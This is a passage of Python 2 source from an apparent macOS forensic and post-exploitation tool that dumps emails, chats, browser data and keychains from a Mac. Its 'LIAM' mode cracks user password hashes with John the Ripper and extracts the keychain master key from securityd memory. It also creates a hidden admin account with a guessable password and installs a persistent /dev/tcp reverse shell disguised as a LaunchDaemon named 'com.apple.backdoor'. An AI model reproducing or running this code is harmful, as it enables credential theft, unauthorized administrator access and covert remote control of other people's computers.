	elif var_version == "11" :
		file=open(file_userslist,'r')
		lines_file = file.readlines()
		file.close()
		var_allusershashes = ""
		for i in range(len(lines_file)):
			#Cas1
			var_usershashes_all=os.popen('dscl . -read /Users/' + lines_file[i].strip("\n") +' ShadowHashData | grep -v ShadowHashData | tr -d " "').read()
			if len(var_usershashes_all) > 300 : var_usershashes=os.popen('dscl . -read /Users/' + lines_file[i].strip("\n") + ' ShadowHashData | cut -f15-31 -d" " | grep -v ShadowHashData | tr -d " "').read().strip("\n")
			else:
				var_usershashes = os.popen('dscl . -read /Users/' + lines_file[i].strip("\n") + ' ShadowHashData | cut -f9-25 -d" " | grep -v ShadowHashData | tr -d " "').read().strip("\n")
			var_usershashes = lines_file[i].strip("\n") + ":" + var_usershashes

			#common
			var_allusershashes = var_allusershashes + var_usershashes + "\n"
		
		print_green("========================================================================")
		print_log("[USERS_HASHES] The available users hashes are the following > ")
		print_green(var_allusershashes)
		print_log("[\USERS_HASHES] Stored into " + file_allusershashes)
		print_green("========================================================================")
		fct_writefile(var_allusershashes,file_allusershashes)
	
	elif var_version == "12" or var_version == "13": 
		#print_log("https://gist.github.com/3258894")
		#print_log("http://www.artiflo.net/2009/08/pbkdf2-et-generation-des-cles-de-chiffrement-de-disque/")
		file=open(file_userslist,'r')
		lines_file = file.readlines()
		file.close()
		var_allusershashes = ""
		for i in range(len(lines_file)):
			var_usershashes = os.popen(dir_path_jtr + '/ml2john.py /private/var/db/dslocal/nodes/Default/users/' + lines_file[i].strip("\n") + '.plist | cut -d ":" -f 2').read()
			var_usershashes = lines_file[i].strip("\n") + ":" + var_usershashes
			#common
			var_allusershashes = var_allusershashes + var_usershashes + "\n"
		
		print_green("========================================================================")
		print_log("[USERS_HASHES] The available users hashes are the following > ")
		print_green(var_allusershashes)
		print_log("[\USERS_HASHES] Stored into " + file_allusershashes)
		print_green("========================================================================")
		fct_writefile(var_allusershashes,file_allusershashes)	



	#crack dump
	if mode == "LIAM" or var_privileges_dump == "singlemode": 
		print_green("========================================================================")
		print_log("\n[USERS_PASSWORD] Be patient, attempt to crack the passwords with found passwords ... (ctrl+c to cancel)")
		os.system(dir_path_jtr + "/john " + file_allusershashes +  " --wordlist=" + file_password_database)
		print_green("========================================================================")
		print_log("The identified usernames/passwords are the followings > ")
		var_crackedhashes=os.popen(dir_path_jtr + "/john --show " + file_allusershashes).read().strip("\n")
		print_green(var_crackedhashes)
		fct_writefile("\n" + var_crackedhashes,file_crackedhashes)

		print_log("\n[USERS_PASSWORD] Be patient, attempt to crack the passwords with special list ... (ctrl+c to cancel)")
		os.system(dir_path_jtr + "/john " + file_allusershashes +  " --wordlist=" + file_wordlist_for_jtr)
		print_green("========================================================================")
		print_log("The identified usernames/passwords are the followings > ")
		var_crackedhashes = os.popen(dir_path_jtr + "/john --show " + file_allusershashes).read().strip("\n")
		print_green(var_crackedhashes)
		fct_writefile(var_crackedhashes,file_crackedhashes)

		print_log("\n[USERS_PASSWORD] Be patient, attempt to crack the passwords with --rules:single and found passwords ... (ctrl+c to cancel)")
		os.system(dir_path_jtr + "/john --rules=single --wordlist=" + file_password_database + " " + file_allusershashes)
		print_green("========================================================================")
		print_log("The identified usernames/passwords are the followings > ")
		var_crackedhashes = os.popen(dir_path_jtr + "/john --show " + file_allusershashes).read().strip("\n")
		print_green(var_crackedhashes)
		fct_writefile("\n" + var_crackedhashes,file_crackedhashes)

		print_log("\n[USERS_PASSWORD] Be patient, attempt to crack the passwords with default method ... (ctrl+c to cancel)")
		os.system(dir_path_jtr + "/john " + file_allusershashes)
		print_green("========================================================================")
		print_log("The identified usernames/passwords are the followings > ")
		var_crackedhashes = os.popen(dir_path_jtr + "/john --show " + file_allusershashes).read().strip("\n")
		print_green(var_crackedhashes)
		fct_writefile("\n" + var_crackedhashes,file_crackedhashes)
		
		print_log("[\USERS_PASSWORD] Stored into " + file_crackedhashes)
		print_green("========================================================================")
		
		var_all_passwords = os.popen("cat " + file_crackedhashes + " | grep -v cracked | cut -d ':' -f 2 | sort | uniq").read()
		fct_add_pass_database(var_all_passwords)

		#john.pot with 777
		os.system("chmod -Rf 777 " + dir_path_jtr)

###################################################################################################################################
										   #[add an user root account]
###################################################################################################################################
def fct_add_user_root():
	#init variables
	print_red_bold("\n[] Add Root User")
	
	user_add = raw_input("Do you want to add user ? y/[n] > ")
	if user_add == "y" :
		#add user with root privileges
		uid_max = os.popen("dscl . -list /Users UniqueID | awk '{print $2}' | sort -ug | tail -1").read()
		uid = int(uid_max)+1
		new_username="sud0" + str(uid)
		passofuser="sud0" + str(uid)
		os.system("dscl . -create /Users/" + new_username)
		os.system("dscl . -create /Users/" + new_username + " UserShell /bin/bash")
		os.system("dscl . -create /Users/" + new_username + " RealName " + new_username)
		os.system("dscl . -create /Users/" + new_username + " UniqueID " + str(uid))
		os.system("dscl . -create /Users/" + new_username + " PrimaryGroupID 20")
		os.system("dscl . -append /Groups/admin GroupMembership " + new_username)
		os.system("dscl . -passwd /Users/" + new_username + " " +  passofuser)
		os.system("dseditgroup -o edit -t user -a " + new_username + " admin")
		os.system("createhomedir -c > /dev/null")
			
		#Active Windows password prompt with field username/password
		#os.system("defaults write /Library/Preferences/com.apple.loginwindow SHOWFULLNAME YES")
			
		print_green("========================================================================")
		print_log("[USER_ADDED] You can connect you with user (root priv.) > ")
		print_green(new_username + "/" + passofuser)
		print_log("[\USER_ADDED] Stored into " + file_useradded)
		print_green("========================================================================")
		fct_writefile(new_username + "/" + passofuser,file_useradded)
	else:
		print_log("[USER_ADDED] No added user")


###################################################################################################################################
										   #[add backdoor]
###################################################################################################################################
def fct_add_backdoor():

	#server : nc -l ip-listen port-TCP
	#to disable : sudo launchctl unload /Library/LaunchDaemons/com.apple.backdoor.plist / launchctl unload ~/Library/LaunchAgents//com.apple.backdoor.plist
	#sudo rm ~/.backdoor.sh
	#sudo rm /Library/LaunchDaemons/com.apple.backdoor.plist

	print_red_bold("\n[] Add Persistent Reverse shell")
	print_green("========================================================================")
	user_backdoor = raw_input("Do you want to add Persistent Reverse Shell toward your Home ? y/[n] > ")
	if user_backdoor == "y" :
		ip_remote = raw_input("[REV_SHELL]Please to input your Home IP > ")
		port_remote = raw_input("[REV_SHELL]Please to input remote TCP port > ")
		if var_privileges_dump == "rootaccess":
			path_launch = "/Library/LaunchDaemons/"
		else:
			path_launch = "/Users/" + var_home + "/Library/LaunchAgents/"

		path_backdoor = "/Users/" + var_home + "/.backdoor.sh"
		
		backdoor_content = "#!/bin/bash\n"
		backdoor_content +=  "bash -i >& /dev/tcp/" + ip_remote + "/" + port_remote + " 0>&1\n"
		backdoor_content += "wait"

		fct_writefile_del(backdoor_content,path_backdoor)
		os.system("chmod +x " + path_backdoor)

		if not os.path.isdir(path_launch):
			os.makedirs(path_launch)
		path_launch += "com.apple.backdoor.plist"

		#https://github.com/tjluoma/launchd-keepalive/blob/master/com.tjluoma.keeprunning.mail.plist
		content_launch = '<?xml version="1.0" encoding="UTF-8"?>\n'
		content_launch += '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
		content_launch += '<plist version="1.0">\n'
		content_launch += "<dict>\n"
		content_launch += "\t<key>KeepAlive</key>\n"
		content_launch += "\t<dict>\n"
		content_launch += "\t\t<key>SuccessfulExit</key>\n"
		content_launch += "\t\t<false/>\n"
		content_launch += "\t</dict>\n"
		content_launch += "\t<key>Label</key>\n"
		content_launch += "\t<string>com.apple.backdoor</string>\n"
		content_launch += "\t<key>ProgramArguments</key>\n"
		content_launch += "\t<array>\n"
		content_launch += "\t\t<string>"
		content_launch += path_backdoor
		content_launch += "</string>\n"
		content_launch += "\t</array>\n"
		content_launch += "\t<key>RunAtLoad</key>\n"
		content_launch += "\t<true/>\n"
		content_launch += "\t<key>StartInterval</key>\n"
		content_launch += "\t<integer>60</integer>\n"
		content_launch += "\t<key>AbandonProcessGroup</key>\n" 
		content_launch += "\t<true/>\n"
		content_launch += "</dict>\n"
		content_launch += "</plist>"

		fct_writefile_del(content_launch,path_launch)
		 
		os.system("chmod 600 " + path_launch)

		os.system("launchctl load " + path_launch)

		print_log("[\REV_SHELL]Please to open TCP port " + port_remote + " on " + ip_remote + ": nc -l " + port_remote)
		print_green("========================================================================")


###################################################################################################################################
										     #[dump of browsers data]
###################################################################################################################################
def fct_dump_secrets_browser(type_search):
	print_red_bold("\n[] Dump Secrets Browsing")
	#init variables
	if type_search == "cookies" :
		db_search = dir_db + 'browser_cookies.db'
	elif type_search == "places" :
		db_search = dir_db + 'browser_hist.db'
	elif type_search == "downloads" :
		db_search = dir_db + 'browser_download.db'
	
	fct_dump_main(db_search,dir_browser_dump,file_log_browser)

###################################################################################################################################
										     #[authentication dump]
###################################################################################################################################
def fct_authentication_dump():
	print_red_bold("\n[] Dump authentication Data")
	fct_dump_main(db_search_authentication,dir_dump_authentication,file_log_authentication)


###################################################################################################################################
										     #[dump of current keychain]
###################################################################################################################################
def fct_dump_current_keychain():
	
	print_red_bold("\n[] Dump Current Keychain")
	path_current_keychain = os.popen("security default-keychain").read()
	filtre_search_keychain = re.compile('"(\/.+)"',re.IGNORECASE)
	res_current_keychain = filtre_search_keychain.findall(path_current_keychain)
	if not os.path.isdir(dir_dump_keychain):
		os.makedirs(dir_dump_keychain)
	for file_current_keychain in res_current_keychain:
		shutil.copyfile(file_current_keychain,file_keychain_current)

		#alternative to stop if you don't know current leychain password
		raw_input("Press enter to extract data stored into current keychain ... \nWarning : Press Ctrl + C during dump process if current keychain is locked and you don't know password")
		os.system("security dump-keychain  -d " + file_current_keychain + " > " + file_current_keychain_decrypted)

		print_log("[KEYCHAIN_CURRENT] Current keychain has been copied > ")
		print_green(file_current_keychain)
		print_log("[KEYCHAIN_CURRENT] Orignal Keychain is stored into " + file_keychain_current)
		print_log("[KEYCHAIN_CURRENT] Decrypted Keychain is stored into " + file_current_keychain_decrypted)
		log_dump = "[KEYCHAIN_CURRENT]\nCopy of encrypted file : " + path_current_keychain.strip("\n") + " to " + file_keychain_current + "\n"
		fct_writefile(log_dump, file_log_keychain)
		log_dump = "[KEYCHAIN_CURRENT]\nCopy of decrypted file : " + path_current_keychain.strip("\n") + " to " + file_current_keychain_decrypted + "\n"
		fct_writefile(log_dump, file_log_keychain)
		

	#Display and record keychain passwords
	file_keychain_decrypted=open(file_current_keychain_decrypted,'r')
	lines_keychain=file_keychain_decrypted.readlines()
	file_keychain_decrypted.close()
	tag = "data:"
	j = 0
	for i in range(len(lines_keychain)) :
		lines_keychain[i] = lines_keychain[i].strip("\n")
		if j == 1 and len(lines_keychain[i]) <= size_pass_keychain and lines_keychain[i] != "" :
			print_green("Password: XXXXXXXXXXXXXXXXXXXX")
			#print_green("Password: " + lines_keychain[i].strip("\"")+"\n")
			fct_writefile("Password: " + lines_keychain[i].strip("\"")+"\n", file_current_keychain_pass)
			fct_add_pass_database(lines_keychain[i].strip("\"")+"\n")
			j = 0
		elif "data:" in lines_keychain[i]:
			j = 1
		else: 
			j = 0
			filtre=re.compile('0x00000007\ \<blob\>\=\"(.+)\"',re.IGNORECASE)
			res=filtre.findall(lines_keychain[i])
			for k in res:
				print_green("\nTarget: " + k)
				fct_writefile("\nTarget: " + k.strip("\"")+"\n", file_current_keychain_pass)

			filtre = re.compile('\"acct\"\<blob\>\=\"(.+)\"',re.IGNORECASE)
			res = filtre.findall(lines_keychain[i])
			for k in res:
				print_green("Login: " + k)
				fct_writefile("Login: " + k.strip("\"")+"\n", file_current_keychain_pass)

	print_log("[\KEYCHAIN_CURRENT] Decrypted passwords into Keychain are stored into " + file_current_keychain_pass)
	


	#dump keychain password with master key in memory
	if var_privileges_dump == "rootaccess":
		("\n\n[KEYCHAIN_CURRENT_JUUSO] Attempting to identification keychain master key in memory (securityd process) ... ")
		res_jusso_dump=os.popen(dir_path_juuso + "keychaindump " + file_current_keychain).read()
		fct_writefile(res_jusso_dump, file_current_keychain_juuso)
		print_log("[KEYCHAIN_CURRENT_JUUSO] Decrypted Keychain is stored into " + file_current_keychain_juuso)
		log_dump = "[KEYCHAIN_CURRENT_JUUSO]\nCopy of keychain passwords opened with master keychain in memory to " + file_current_keychain_juuso + "\n"
		fct_writefile(log_dump, file_log_keychain)

		#print and record keychain password
		file = open(file_current_keychain_juuso,'r')
		lines_juuso = file.readlines()
		file.close()
	
		for i in range(len(lines_juuso)):
			filtre = re.compile('^(.+)\:(.+)\:(.+)',re.IGNORECASE)
			res = filtre.findall(lines_juuso[i])
			for j in res:
				var_login = j[0]
				var_pass = j[2]
				var_target = j[1]
				
				print_green("Target: " + var_target.strip("\""))
				fct_writefile("\nTarget: " + var_target.strip("\"")+"\n", file_current_keychain_juuso_pass)
				
				print_green("Login: " + var_login.strip("\""))
				fct_writefile("Login: " + var_login.strip("\"")+"\n", file_current_keychain_juuso_pass)
				
				#print_green("Password: " + var_pass.strip("\"") + "\n")
				print_green("Password: XXXXXXXXXXXXXXXXXXXX" + "\n")
				fct_writefile("Password: " + var_pass.strip("\"")+"\n", file_current_keychain_juuso_pass)
				
				fct_add_pass_database(var_pass.strip("\"")+"\n")

		print_log("[\KEYCHAIN_CURRENT_JUUSO] Decrpyted passwords into Keychain are stored into " + file_current_keychain_juuso_pass)


###################################################################################################################################
										     #[dump all keychains]
###################################################################################################################################
def fct_dump_all_keychain():
	
	print_red_bold("\n[] Dump Keychain Files")
	fct_dump_main(db_search_keychain,dir_dump_keychain,file_log_keychain)

###################################################################################################################################
										     #[dump skype messages]
###################################################################################################################################
def fct_dump_skype():
	#Extract all database
	print_red_bold("\n[] Dump Skype Messages")
	fct_dump_main(db_search_skype,dir_dump_skype,file_log_skype)

###################################################################################################################################
										     #[dump chat messages, ichat, adium ]
###################################################################################################################################
def fct_dump_chat():
	print_red_bold("\n[] Dump Chat Messages")
	fct_dump_main(db_search_chat,dir_dump_chat,file_log_chat)

###################################################################################################################################
										     #[dump ios db backup ]
###################################################################################################################################
def fct_dump_ios():
	print_red_bold("\n[] Dump iOS Files")
	fct_dump_main(db_search_ios_db,dir_dump_ios,file_log_ios)

###################################################################################################################################
										     #[dump email spotlight]
###################################################################################################################################
def fct_dump_email_spot() :
	print_red_bold("\n[] Dump Emails Text (Spotlight)")
	if var_version == "10":
		fct_dump_main(db_search_email_spot_sl,dir_dump_email_spot,file_log_email_spot)
	else:
		fct_dump_main(db_search_email_spot,dir_dump_email_spot,file_log_email_spot)
	

###################################################################################################################################
										     #[dump email]
###################################################################################################################################
def fct_copy_mbox(action, path_mbox, account_name, dir_dump_email_spec,sub_path):

	print_log("\n[" + action + "] Copy of > \n[" + path_mbox + sub_path + "]")
	#dir_dump_email_spec = dir_dump_email_spec.replace("@","\@")
	#path_mbox = path_mbox.replace("@","\@").replace(" ","\ ")
	destination_mbox = dir_dump_email_spec + sub_path
	path_mbox = path_mbox + sub_path

	if not os.path.isdir(destination_mbox) :
		print_green("Copy of files, be patient ...\n...\n...")
		res_cmd = "[" + action + "] Copy of directory : " + path_mbox + " to " + destination_mbox + "\n"
		fct_writefile(res_cmd, file_log_email)
		try:
			shutil.copytree(path_mbox,destination_mbox)
			print_log("[\\" + action + "] Stored into " + dir_dump_email_spec)
		except shutil.Error, exc:
			errors = exc.args[0]
			for error in errors:
				src, dst, msg = error
				print_log("[\\" + var_search.upper() + "] You have not sufficient privileges to dump " + src + ":(")
	print_green("========================================================================")


#main
def fct_dump_email():

	print_red_bold("\n[] Dump content of Emails (mbox files)")

	dump_emails_or_not = raw_input("Do you want copy Mail Boxes (.mbox) ? y/[n] > ")
	
	mbox_available_once = 0

	if dump_emails_or_not == "y" :

		#extract path mail
		file = open(db_search_email,'r')
		lines_mail = file.readlines()
		file.close()

		#extract username list
		file = open(file_userslist,'r')
		lines_username = file.readlines()
		file.close()

		#for each user
		for index_user in range(len(lines_username)):
			username = lines_username[index_user].strip("\n")

			#for each path to email 
			for index_mail in range(len(lines_mail)):
				path_mail = lines_mail[index_mail].strip("\n").replace("<USERNAME>",username)

				#dump from mounted volume or target mode
				if var_privileges_dump == "target": 
					path_mail = path_to_HD_target + path_mail

				if os.path.exists(path_mail):

					mbox_available = 0

					#tab to stored each  mail account
					tab_mail_box = []
					path_to_mail = path_mail.replace("<USERNAME>",username)
					if os.path.isdir(path_to_mail): 
						for file in os.listdir(path_to_mail):
							if "@" in file:
								tab_mail_box.append(path_to_mail + file)
								mbox_available = 1
								mbox_available_once = 1

					if mbox_available==1:
						#for each mail account identified
						for index_account in range(len(tab_mail_box)):
							path_to_mbox = tab_mail_box[index_account]

							#for path with domain name (ex : ~/Library/Mail/V2/EWS-XXX\\amalard\@exchange.xxx.com/)
							path_to_mbox = path_to_mbox.replace("\\\\\\\\","\\\\")
							path_to_mbox = path_to_mbox.strip("\n")
							
							#extract name of account
							filtre = re.compile('\/.*\/(.+)',re.IGNORECASE)
							res = filtre.findall(path_to_mbox)
							for account_name in res:
								print_green("\n========================================================================")
								print_log("Available Mail Boxes for account " + account_name + " (system user : " + username + ") > ")
								
								#creation of directory to store results
								if not os.path.isdir(dir_dump_email):
									os.makedirs(dir_dump_email)
								dir_dump_email_spec=dir_dump_email + "emailBox-" + username + "_" + account_name
								#if not os.path.isdir(dir_dump_email_spec):
								#	os.makedirs(dir_dump_email_spec)

								tab_ls_mbox = []
								for file in os.listdir(path_to_mbox.replace("\ "," ")):
									if "mbox" in file and ".plist" not in file:
										#print available mbox
										print_green(file)
										#backup available mbox
										tab_ls_mbox.append(file)
										#recording list of available mbox
										file_ls_mbox=dir_dump_email_spec + "_ls_mbox.txt"
										fct_writefile(file + "\n",file_ls_mbox)
										
								#menu
								print_log("Dump options :")
								print_green ("1. Dump all mBox")
								print_green ("2. Dump special mBox")
								print_green ("n. See next available mBox")
								print_green ("c. Do not dump")
								option_dump = raw_input('Choose an option > ')
								
								#dump all email
								
								if option_dump == "1":						
									#copy of all mbox into local
									for index_file_mbox in range(len(tab_ls_mbox)):
										sub_path = "/" + tab_ls_mbox[index_file_mbox]
										fct_copy_mbox("DUMP_" + tab_ls_mbox[index_file_mbox] +"_EMAILS",path_to_mbox,account_name,dir_dump_email_spec,sub_path)

								#dump special mBox
								if option_dump == "2": 
									print_log("\nAvailable Mail Boxes > ")
									for index_file_mbox in range(len(tab_ls_mbox)):
										print_green (str(index_file_mbox) + ". " + tab_ls_mbox[index_file_mbox])

									selected_mbox_tab = []
									selected_mbox = "null"
									empty_box = "1"
									print_log('Choose Mail Boxes (one per line) and finish with "."')
									while selected_mbox != ".":
										selected_mbox=raw_input("> ")
										try:
											if selected_mbox != "." and selected_mbox != "" and int(selected_mbox)<len(tab_ls_mbox): 
												empty_box = "0"
												selected_mbox_tab.append(selected_mbox.strip())
										except ValueError:
											print_red("\nPlease to choose a valid Mail Box\n")

									if empty_box == "1": 
										print_log("No selected Mail Box ")
										continue

									#backup selected mbox 
									for i in range(len(selected_mbox_tab)):
										name_box = tab_ls_mbox[int(selected_mbox_tab[i])]
										sub_path = "/" + name_box
										fct_copy_mbox("DUMP_" + name_box +"_EMAILS",path_to_mbox,account_name,dir_dump_email_spec,sub_path)

								#to jump to next user or quit
								elif option_dump == "n":
									continue

								elif option_dump == "c":
									break

								#cancel action for this system user
								else:
									break
		if mbox_available_once == 0: 
			# print_green(========================================================================")
			print_log("\nNo Mail Box identified\n")


###################################################################################################################################
										     #[dump ical]
###################################################################################################################################
def fct_dump_ical():
	print_red_bold("\n[] Dump Calendar (Spotlight)")
	#Extract all database
	fct_dump_main(db_search_calendar,dir_dump_calendar,file_log_calendar)


###################################################################################################################################
										     #[dump log]
###################################################################################################################################
def fct_dump_log():
	print_red_bold("\n\n[] Dump Log Files")
	fct_dump_main(db_search_log,dir_dump_log,file_log_log)

###################################################################################################################################
										     #[Dump printed files]
###################################################################################################################################
def fct_dump_printed_doc():
	if var_privileges_dump != "useraccess":
		print_red_bold("\n[] Dump Printed Documents")
		fct_dump_main(db_search_print,dir_dump_print,file_log_print)
		path_to_dir = dir_dump_print + "PRINTED_DOCUMENTS/"
		for file in os.listdir(path_to_dir):
			path_to_doc = path_to_dir + file
			type_file = os.popen("file " + path_to_doc).read()
			if "PDF" in type_file or "pdf" in type_file:
				newfile = path_to_doc + ".pdf"
				shutil.move(path_to_doc,newfile)
			elif "directory" in type_file:
				shutil.rmtree(path_to_doc)
			else:
				os.remove(path_to_doc)

###################################################################################################################################
										     #[dump Applications]
###################################################################################################################################
def fct_dump_appli():
	print_red_bold("\n[] Dump List Of Installed Application")
	fct_dump_main(db_search_appli,dir_dump_appli,file_log_appli)

###################################################################################################################################
										     #[dump persistence parameters]
###################################################################################################################################
def fct_dump_persist():
	print_red_bold("\n[] Dump List Of Persistence Parameters")
	fct_dump_main(db_search_persist,dir_dump_persist,file_log_persist)

###################################################################################################################################
										     #[dump trojan files]
###################################################################################################################################

def fct_dump_trojans():
	print_red_bold("\n[] Check If a Known Trojan Is Installed")
	fct_dump_main(db_search_trojans,dir_dump_trojans,file_log_trojans)

###################################################################################################################################
										     #[dump user config, recent files, ...]
###################################################################################################################################
def fct_dump_artifact_user():
	print_red_bold("\n[] Dump User Artifacts (preferences, recent search, ...)")
	fct_dump_main(db_search_artifact_user,dir_dump_artifact_user,file_log_artifact_user)

###################################################################################################################################
										     #[dump user config, recent files, ...]
###################################################################################################################################
def fct_dump_del_recover():
	print_red_bold("\n[] Dump deleted and recovered files")
	fct_dump_main(db_search_del_recover,dir_dump_del_recover,file_log_del_recover)

###################################################################################################################################
										     #[dump spotlight database]
###################################################################################################################################
def fct_dump_spotlight():
	print_red_bold("\n[] Dump Spotlight Database")
	fct_dump_main(db_search_spotlight,dir_dump_spotlight,file_log_spotlight)

###################################################################################################################################
										     #[dump hibernate and swap files]
###################################################################################################################################
def fct_dump_hiberswap():
	print_red_bold("\n[] Dump Hibernation And Swap Files")
	res=raw_input("Do you want to extract hibernation and swap files ? y/[n] > ")
	if res == "y":
		fct_dump_main(db_search_hiberswap,dir_dump_hiberswap,file_log_hiberswap)


###################################################################################################################################
										     #[dump Contacts]
###################################################################################################################################
def fct_dump_contact():
	print_red_bold("\n[] Dump contacts into Address Book")
	fct_dump_main(db_search_contact,dir_dump_contact,file_log_contact)


###################################################################################################################################
										     #[dump miscellaneous Network and System History]
###################################################################################################################################
def fct_dump_history_net_sys():
	print_red_bold("\n[] Dump miscellaneous System and Network History")
	fct_dump_main(db_search_history_net_sys,dir_dump_history_net_sys,file_log_history_net_sys)


###################################################################################################################################
										     #[dump Stickies]
###################################################################################################################################
def fct_dump_stickies():
	print_red_bold("\n[] Dump Notes into Stickies")
	fct_dump_main(db_search_stickies,dir_dump_stickies,file_log_stickies)


###################################################################################################################################
										     #[dump information about Mac building]
###################################################################################################################################
def fct_dump_system_build():
	print_red_bold("\n[] Dump information about Mac building")
	fct_dump_main(db_search_system_build,dir_dump_system_build,file_log_system_build)

###################################################################################################################################
										     #[check OS]
###################################################################################################################################
def fct_check_os(var_version):
	if var_version == "12":
		os_version = "Mountain Lion / 10.8"
		return(os_version)
	elif var_version == "11":
		os_version = "Lion / 10.7"
		return(os_version)
	elif var_version == "10":
		os_version = "Snow Leopard / 10.6"
		return(os_version)
	elif var_version == "13":
		os_version = "Mavericks / 10.9"
		return(os_version)
	else:
		print_red("\nUnsupported OS version.")
		sys.exit()


####################################################################################################################################
												   #MAIN PROGRAM
####################################################################################################################################

############################################
#[Start program]
############################################

#dump from mounted volume or target mode
if var_privileges_dump == "target": 
	path_to_HD_target = sys.argv[3]

	if not os.path.isdir(root_dir_results):
		os.makedirs(root_dir_results)
		os.system('chmod 777 ' + root_dir_results)

	os.makedirs(dir_results)

	print_log("\nThe results will be stored in > " + dir_results)
	print_green("========================================================================")
	mode = "FD"
	os_version = fct_check_os(var_version)
	fct_writefile_del(os_version, file_version_dest)
	print_green("\nOS detected > " + os_version)
	fct_dump_by_target()
	os.system('chmod -Rf 777 ' + dir_results)
	os.system('chmod -Rf 777 ' + dir_results + '/*')
	sys.exit()

#dump live
elif var_privileges_dump == "LIVE":

	dir_results = sys.argv[3]
	os_version = fct_check_os(var_version)
	file_version_dest = dir_results + "/#macosx_version.txt"
	fct_writefile_del(os_version, file_version_dest)
	#change path
	file_userslist,db_search_sys,file_log_sys,dir_dump_sys = fct_dump_live_change_dir()
	print_red_bold("\n[] Dump Network and System State")
	fct_dump_main(db_search_sys,dir_dump_sys,file_log_sys)
	os.system('chmod -Rf 777 ' + dir_results)
	os.system('chmod -Rf 777 ' + dir_results + '/*')
	sys.exit()


#standard mode
else:
	os_version = fct_check_os(var_version)
	if var_privileges_dump == "singlemode": 
		print_red_bold("\n                     ====Exploit Single Mode====")
		print_green("========================================================================")
		res = raw_input("\nSingle Mode is available in pressing ⌘ + S during system boot \n\nPlease to refer you to readme.txt for using \n\nTricks> Launch script command before to launch single mode to get traces :-) and use scan_typescript.py to view\n\nPress any key to continue or b to back\n")
		if res == "b":
			exit()
	elif var_privileges_dump == "rootaccess":
		print_red_bold("\n                     ====Exploit Root Access====")
	elif var_privileges_dump == "useraccess":
		print_red_bold("\n                     ====Exploit User Access====")

	print_green("========================================================================")



if not os.path.isdir(root_dir_results):
	os.makedirs(root_dir_results)
	os.system('chmod 777 ' + root_dir_results)

os.makedirs(dir_results)
fct_writefile_del(os_version, file_version_dest)

print_log("Current user is : " + var_home)
if var_uid != 0:
	print_log("You are not ROOT :(")
else:
	print_log("You are ROOT :)")
print_log("The results will be stored in > " + dir_results)
print_green("========================================================================")


#Menu
selected_mode = "null"

while selected_mode == "null":

	if var_privileges_dump == "rootaccess" or var_privileges_dump == "useraccess":
		print_green("1: Full Dump Mode (investigator mode)")
		print_green("2: LIAM Mode (Leak Info And More ...)")

		selected_mode = raw_input("\nYour choice (b to back) > ")

		if selected_mode == "1": 
			mode = "FD"
			var_log = str(datetime.datetime.now()) + ": " + "Full Dump Mode" + " / " + var_privileges_dump + "\n"
			fct_writefile(var_log, file_history_dest)
		
		elif selected_mode == "2": 
			mode = "LIAM"
			var_log = str(datetime.datetime.now()) + ": " + "LIAM Mode" + " / " + var_privileges_dump + "\n"
			fct_writefile(var_log, file_history_dest)
		
		elif selected_mode == "b":
			exit()
		else: 
			print_red("\nPlease to choose 1 or 2\n")
			selected_mode = "null"			

	#for single mode => Quick Mode
	else:
		var_log=str(datetime.datetime.now()) + ": " + "Single Mode" + "\n"
		fct_writefile(var_log, file_history_dest) 
		mode = "FD"
		selected_mode = "no_null"	


#create of directory
os.makedirs(dir_passwords)

#log current user
if not os.path.isdir(dir_users_info):
	os.makedirs(dir_users_info)

fct_writefile(var_home, file_current_user)


#[if single mode]
if var_privileges_dump == "singlemode":
	#test if you are root
	if var_uid != 0 : 
		print_red("\nPlease run program with root privileges.\n")
		sys.exit()
	fct_load_opendirectoryd()

#dump usernames, admin, ...
fct_dump_users()

#identify dump
fct_identity()

#dump information about Mac installation
fct_dump_system_build()

#authentication dump
fct_authentication_dump()

#dump miscellious history
fct_dump_history_net_sys()

#dump current keychain
if var_privileges_dump != "singlemode":
	fct_dump_current_keychain()	

#[if root access or single mode]
if var_privileges_dump == "rootaccess" or var_privileges_dump == "singlemode":

	#dump all keychain files
	fct_dump_all_keychain()

	#dump hashes and attempting to crack passwords
	fct_dump_users_hashes()


# dump browser secrets
type_search=["cookies","places","downloads"]
for i in range(len(type_search)):
	fct_dump_secrets_browser(type_search[i])
		
#calendar dump
fct_dump_ical()

#skype messages dump
fct_dump_skype()

#dump chat messages
fct_dump_chat()

#dump Address book
fct_dump_contact()

#dump stickies
fct_dump_stickies()

# dump printed files
fct_dump_printed_doc()

# dump ios db backup
fct_dump_ios()

#dump email content (sqlite spotlight)
fct_dump_email_spot()

#Only Full Dump
if mode != "LIAM" :
	#dump installed application, updates and association file
	fct_dump_appli()
	#dump trojan files
	fct_dump_trojans()
	#dump user conf recent
	fct_dump_artifact_user()
	#deleted and recovered files
	fct_dump_del_recover()
	#Spotlight dump
	fct_dump_spotlight()
	#dump persistence parameters
	fct_dump_persist()
	#dump email content (mbox)
	fct_dump_email()


#add user with root privileges in Single Mode AND mode LIAM (Leak Info And More)
if var_privileges_dump == "singlemode" or (var_privileges_dump == "rootaccess" and mode == "LIAM") : 
	fct_add_user_root()

if mode == "LIAM":
	fct_add_backdoor()

#[if root access] and not quick mode
if (var_privileges_dump == "rootaccess" and mode != "LIAM") or var_privileges_dump == "singlemode":
	#dump log
	fct_dump_log()
	#dump hiberfile and swap files
	fct_dump_hiberswap()

os.system('chmod -Rf 777 ' + dir_results)





